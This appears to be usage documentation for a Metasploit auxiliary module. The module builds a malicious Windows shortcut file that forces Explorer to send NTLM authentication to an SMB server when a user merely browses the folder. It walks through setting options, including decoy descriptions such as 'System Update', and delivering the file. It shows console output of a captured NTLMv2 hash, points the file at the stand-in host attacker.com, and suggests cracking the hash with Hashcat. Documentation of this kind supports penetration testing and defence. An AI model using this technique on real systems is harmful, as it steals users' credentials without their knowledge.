This module generates a malicious Windows shortcut (LNK) file that embeds a special UNC path within the IconEnvironmentDataBlock of the Shell Link structure. When a victim browses to the directory containing the LNK file in Windows Explorer, it triggers an automatic authentication attempt to the specified remote SMB server, allowing for the capture of NTLM hashes.

The exploit relies on how Windows processes LNK files with manipulated environment data blocks, leading to unsolicited SMB connections without requiring the user to open the file.

## Vulnerable Application

Windows systems using Explorer to browse directories with LNK files, where the IconEnvironmentDataBlock can force SMB authentication leaks.

References:
- [Right-Click LNK](https://zeifan.my/Right-Click-LNK/)

Disclosure Date: 2025-05-16.

## Verification Steps

1. Start msfconsole.
2. Load the module: `use auxiliary/fileformat/iconenvironmentdatablock_lnk`.
3. Set options like FILENAME, UNC_PATH, or others as needed.
4. Execute the module: `run`.
5. A malicious LNK file is generated.
6. If UNC_PATH is not set, an integrated SMB capture server starts.
7. Place the LNK in a target directory.
8. Browse the directory in Windows Explorer to trigger the SMB connection.
9. Check the console for captured NTLM hashes.

## Options

### FILENAME

The name of the generated LNK file.

Default: `msf.lnk`

Example:
```
set FILENAME leak.lnk
```

### UNC_PATH

The UNC path (e.g., `\\server\share`) for the LNK to connect to. If unset, the module starts its own SMB server.

Example:
```
set UNC_PATH \\192.168.1.100\share
```

### DESCRIPTION

Optional description for the shortcut. If unset, a random sentence is generated.

Example:
```
set DESCRIPTION System Update
```

### ICON_PATH

Optional icon path for the LNK. If unset, a random system icon path is generated.

Example:
```
set ICON_PATH %SystemRoot%\\System32\\shell32.dll
```

### PADDING_SIZE

Size of padding in the command arguments.

Default: 10

Example:
```
set PADDING_SIZE 20
```

### Advanced Options

**SRVHOST**

Local host for the integrated SMB server (if UNC_PATH is unset).

Default: `0.0.0.0`

Example:
```
set SRVHOST 192.168.1.25
```

**SRVPORT**

Local port for the integrated SMB server.

Default: `445`

Example:
```
set SRVPORT 445
```

## Scenarios

### NTLM Hash Capture via Integrated Server

Target: Windows system with Explorer.

```
msf > use auxiliary/fileformat/iconenvironmentdatablock_lnk
msf auxiliary(fileformat/iconenvironmentdatablock_lnk) > set FILENAME leak.lnk
FILENAME => leak.lnk
msf auxiliary(fileformat/iconenvironmentdatablock_lnk) > set SRVHOST 192.168.1.25
SRVHOST => 192.168.1.25
msf auxiliary(fileformat/iconenvironmentdatablock_lnk) > set DESCRIPTION Fake Shortcut
DESCRIPTION => Fake Shortcut
msf auxiliary(fileformat/iconenvironmentdatablock_lnk) > set PADDING_SIZE 15
PADDING_SIZE => 15
msf auxiliary(fileformat/iconenvironmentdatablock_lnk) > run

[*] Creating 'leak.lnk' file...
[+] LNK file created: leak.lnk
[*] Listening for hashes on 192.168.1.25:445
[*] Auxiliary module execution completed
```

Deliver `leak.lnk` to a target folder. Browsing the folder triggers an SMB connection:

```
[*] SMB Captured - 2025-09-18 21:07:00 +0530
NTLMv2 Response Captured from 192.168.1.50:49180 - 192.168.1.50
USER:victim DOMAIN:VICTIMPC OS: Windows 10 LM:
LMHASH:Disabled
LM_CLIENT_CHALLENGE:Disabled
NTHASH:samplehash
NT_CLIENT_CHALLENGE:samplechallenge
```

Crack the hash with tools like Hashcat.

### Custom UNC Path Usage

For an external SMB setup:

```
msf auxiliary(fileformat/iconenvironmentdatablock_lnk) > set UNC_PATH \\attacker.com\captureshare
UNC_PATH => \\attacker.com\captureshare
msf auxiliary(fileformat/iconenvironmentdatablock_lnk) > run

[*] Creating 'msf.lnk' file...
[+] LNK file created: msf.lnk
[*] Auxiliary module execution completed
```

Monitor the external server for authentication attempts.